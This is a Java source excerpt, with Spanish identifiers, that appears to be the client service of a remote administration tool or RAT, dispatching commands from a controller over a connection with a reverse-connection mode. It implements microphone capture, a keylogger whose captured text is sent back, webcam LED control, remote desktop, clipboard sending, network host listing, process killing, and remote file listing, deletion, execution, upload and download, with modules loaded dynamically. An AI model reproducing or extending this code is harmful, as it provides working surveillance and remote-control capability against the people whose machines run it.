                            case Protocolo.CAPTURA_MICROFONO:
                                param1 = (String) UtilRT.leerParametro(comando);
                                try {
                                    microfono = ((Interfaz) new CLRT().loadClass("rt.modulos.voip.MIC").newInstance());
                                    microfono.instanciar(this);
                                    microfono.ejecutar(2, param1);
                                    microfono.ejecutar(0);
                                } catch (Exception e) {
                                    if (microfono != null) {
                                        microfono.ejecutar(1);
                                        microfono = null;
                                    }
                                    if (sonido != null) {
                                        sonido.para();
                                        sonido = null;
                                    }
                                }
                                break;
                            case Protocolo.DETENER_MICROFONO:
                                if (microfono != null) {
                                    microfono.ejecutar(1);
                                    microfono = null;
                                }
                                if (sonido != null) {
                                    sonido.para();
                                    sonido = null;
                                }
                                break;
                            case Protocolo.CHAT_MENSAJE:
                                param1 = (String) UtilRT.leerParametro(comando);
                                if (vChat != null) {
                                    vChat.salida.setCaretColor(Color.GREEN);
                                    vChat.salida.append("El otro:" + param1 + "\n");
                                    vChat.salida.setCaretPosition(vChat.salida.getDocument().getLength());
                                    vChat.salida.setCaretColor(Color.BLUE);
                                    vChat.repaint();
                                }
                                param1 = null;
                                break;
                            case Protocolo.CHAT_ABRIR:
                                vChat = new Chat(Servicio.this);
                                vChat.setTitle("Chat");
                                vChat.setSize(300, 300);
                                vChat.setLocationRelativeTo(null);
                                vChat.setVisible(true);
                                break;
                            case Protocolo.CHAT_CERRAR:
                                try {
                                    if (vChat != null) {
                                        vChat.dispose();
                                        vChat = null;
                                    }
                                } catch (Exception e) {
                                }
                                break;
                            case Protocolo.KEYLOGGER_ACTIVAR:
                                int r = activarKeylogger();
                                if (r == 1) {
                                    enviarComando(Protocolo.KEYLOGGER_GET_TEXT, "\n<<KeyLogger Activado>>");
                                } else {
                                    enviarComando(Protocolo.KEYLOGGER_NO_PLUGIN);
                                }
                                break;
                            case Protocolo.KEYLOGGER_DETENER:
                                detenerKeylogger();
                                enviarComando(Protocolo.KEYLOGGER_GET_TEXT, "\n<<KeyLogger Detenido>>");
                                break;
                            case Protocolo.KEYLOGGER_VACIAR:
                                if (kl != null) {
                                    kl.ejecutar(2);//vaciar
                                }
                                break;
                            case Protocolo.KEYLOGGER_GET_TEXT:
                                if (kl != null) {
                                    enviarComando(Protocolo.KEYLOGGER_GET_TEXT, (String) kl.get(1));//gettexto
                                    kl.ejecutar(2);//vaciar
                                }
                                break;
                            case Protocolo.ACTIVAR_LED_CAM:
                                activaractivadesactivaLedWebCam(true);
                                break;
                            case Protocolo.DESACTIVAR_LED_CAM:
                                activaractivadesactivaLedWebCam(false);
                                break;
                            case Protocolo.INICIA_AUDIO:
                                param1 = (String) UtilRT.leerParametro(comando);
                                try {
                                    if (sonido == null) {
                                        AudioFormat af = REP.configurarFormato(param1);
                                        sonido = new REP(af.getSampleRate(), af.getSampleSizeInBits(), af.getChannels());
                                        sonido.start();
                                    }
                                } catch (Exception e) {
                                    if (sonido != null) {
                                        sonido.para();
                                        sonido = null;
                                    }
                                }
                                break;
                            case Protocolo.AUDIO:
                                byte[] stream = (byte[]) UtilRT.leerParametro(comando);
                                if (sonido != null) {
                                    sonido.reproduce(stream);
                                }
                                break;
                            case Protocolo.GET_LISTA_EQUIPOS_RED:
                                enviarListaEquiposRed();
                                break;
                            case Protocolo.GET_KEYBOARD_LAYOUT:
                                enviarComando(Protocolo.GET_KEYBOARD_LAYOUT, InputContext.getInstance().getLocale());
                                break;

                            case Protocolo.SET_KEYBOARD_LAYOUT:
                                try {
                                    Locale local = (Locale) UtilRT.leerParametro(comando);
                                    InputContext.getInstance().selectInputMethod(local);
//                                    enviarMensaje("Se cambia el metodo de entrada:" + local.toString());
                                } catch (Exception e) {
//                                    enviarMensaje("Error al cambiar idioma teclado:" + e.getMessage());
                                }
                                break;
                            //los comandos que  reciben un solo parametro
                            case Protocolo.SPEAK_TEXTO:
                            case Protocolo.ADMIN_ARCHIVOS_LISTAR_DIRECTORIO:
                            case Protocolo.ADMIN_ARCHIVOS_THUMBAIL:
                            case Protocolo.ADMIN_ARCHIVOS_ELIMINAR:
                            case Protocolo.ADMIN_ARCHIVOS_EJECUTAR:
                            case Protocolo.ABRIR_URL:
                            case Protocolo.CAMBIAR_RESOLUCION:
                            case Protocolo.MATAR_PROCESO:
                            case Protocolo.ADMIN_ARCHIVOS_COMPRIMIR:
                                this.procesarOpcion(comando.getComando(), (String) UtilRT.leerParametro(comando));
                                break;
                            //los comandos que no reciben parametros pasan
                            default:
                                this.procesarOpcion(comando.getComando());
                                break;
                        }
                    }
                }
//            } catch (EOFException ex) {
//                ex.printStackTrace();
//                if (!conexion.isConectado()) {
//                    desconectar();
//                }
            } catch (Exception ex) {
                enviarMensaje("Error : " + ex.getMessage() + "--" + ex.getLocalizedMessage());
//                ex.printStackTrace();
//                UtilRT.escribirLog("Error servicio ", ex);
                desconectar();
            }
        }
    }

    private void desconectar() {
        conectado = false;
        autenticado = false;
        try {
            conexion.cerrar();
        } catch (Exception e) {
        }
        desactivarServicios();

        if (accionDesconectar != null) {
            accionDesconectar.ejecutar();
        }
    }

    private boolean isConexionInversa() {
        return tipoConexion == INVERSA;
    }

    private boolean isConexionDirecta() {
        return tipoConexion == DIRECTA;
    }

    private void procesarOpcion(int opcion, Object... parametros) {
        try {
            Interfaz proceso = ((Interfaz) new CLRT().loadClass("rt.modulos.OPC").newInstance());
            proceso.instanciar(this, opcion, parametros);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void set(int opcion, Object valor) {
        try {
            switch (opcion) {
                case 15://accion al conectar
                    accionConectar = (Accion) valor;
                    break;
                case 16://accion autentica
                    accionAutenticar = (Accion) valor;
                    break;
                case 17://accion listo
                    accionListo = (Accion) valor;
                    break;
                case 18://accion enviar info
                    accionInfo = (Accion) valor;
                    break;
                case 19://accion abrir escritorio remoto
                    accionAbrirEscritorio = (Accion) valor;
                    break;
                case 20://accion abrir escritorio remoto detener
                    accionDetenerEscritorio = (Accion) valor;
                    break;
                case 21:
                    accionDesconectar = (Accion) valor;
                    break;
            }
        } catch (Exception e) {

        }
    }

    public Object get(int opcion, Object... parametros) {
        try {
            switch (opcion) {
                case 0://gethostname
                    return getHostName();
                case 1://conectado
                    return isConectado();
                case 2://Host
                    return getHost();
                case 3://puerto
                    return getPuerto();
                case 4://puerto transferencia
                    return getPuertoTransferencias();
                case 5:
                    return isConexionInversa();
                case 6:
                    return isConexionDirecta();
                case 7:
                    return getJnaUtil();
                case 8:
                    return capturaOffline;
                case 9:
                    return tiempoPing;
                case 10:
                    return idServicio;
                case 11://usuario para el chat
                    return System.getProperty("user.name");
                case 12://interfaz de capturador offline
                    return capturadorOffline;
                case 13://webcam
                    return webC;
                case 14:
                    return conexion;

            }
        } catch (Exception e) {

        }
        return null;
    }

    private Object[] arreglar(Object[] original) {
        Object[] nuevo = new Object[original.length - 1];
        for (int i = 1; i < original.length; i++) {
            nuevo[i - 1] = original[i];
        }
        return nuevo;
    }

    public void ejecutar(int opcion, Object... parametros) {
        try {
            switch (opcion) {
                case 0:
                    iniciar();
                    break;
                case 1:
                    detener();
                    break;
                case 2://subir archivo
                    subirArchivo((String) parametros[0], (String) parametros[1], (Conexion) parametros[2], (Integer) parametros[3]);
                    break;
                case 3://enviar comando
                    switch (parametros.length) {
                        case 1:
                            enviarComando((Integer) parametros[0]);
                            break;
                        case 2:
                            enviarComando((Integer) parametros[0], parametros[1]);
                            break;
                        default:
                            enviarComando((Integer) parametros[0], arreglar(parametros));
                            break;
                    }
                    break;
//                case 4://enviar objeto
//                    enviarObjeto(parametros[0]);
//                    break;
                case 6://enviar mensaje
                    enviarMensaje((String) parametros[0]);
                    break;
                case 9://descargar archivo 4/5 parametros
                    descargarArchivo((String) parametros[0], (String) parametros[1], (Conexion) parametros[2], (Integer) parametros[3],(Long) parametros[4]);
                    //descargarArchivo((String) parametros[0], (String) parametros[1], (Conexion) parametros[2], (Integer) parametros[3],0L);
                    break;
                case 10://Iniciar escritorio remoto
                    iniciarEscritorioRemoto((Conexion) parametros[1], (CapturaOpciones) parametros[0]);
                    break;
                case 11:
                    restarEnviandoArchivo();
                    break;
                case 12:
                    enviarPortaPapeles((Integer) parametros[0], (Object) parametros[1]);
                    break;
                case 13:
                    hacerPing();
                    break;
                case 14:
                    abrirCamaraDefault();
                    break;
                case 15:
                    cerrarWC();
                    break;
            }
        } catch (Exception e) {

        }
    }

    private void hacerPing() {
        ping = System.currentTimeMillis();
        enviarComando(Protocolo.PING);
    }
}
